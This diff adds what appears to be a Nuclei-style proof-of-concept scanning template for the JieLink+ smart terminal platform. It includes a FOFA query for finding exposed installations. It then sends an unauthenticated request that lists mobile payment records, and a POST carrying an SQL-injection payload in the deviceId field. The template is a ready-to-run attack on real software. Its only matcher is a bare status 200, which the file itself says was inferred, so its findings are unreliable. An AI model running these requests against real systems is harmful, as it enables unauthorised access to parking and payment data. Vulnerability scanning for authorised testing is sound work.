@@ -1,0 +1,48 @@
+id: poc-fyxrgmrf9cgbcrqx
+info:
+  name: JieLink+智能终端操作平台近期漏洞合集
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fyxrgmrf9cgbcrqx
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fyxrgmrf9cgbcrqx
+    fofa: title=="JieLink+智能终端操作平台"
+http:
+- raw:
+  - GET /mobile/pay/GetDataList?plate=&mobile=&pageSize=100&pageIndex=1 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /mobile/Remote/GetParkController HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 20
+
+    Accept: application/json, text/plain
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/536.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    deviceId=1*'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
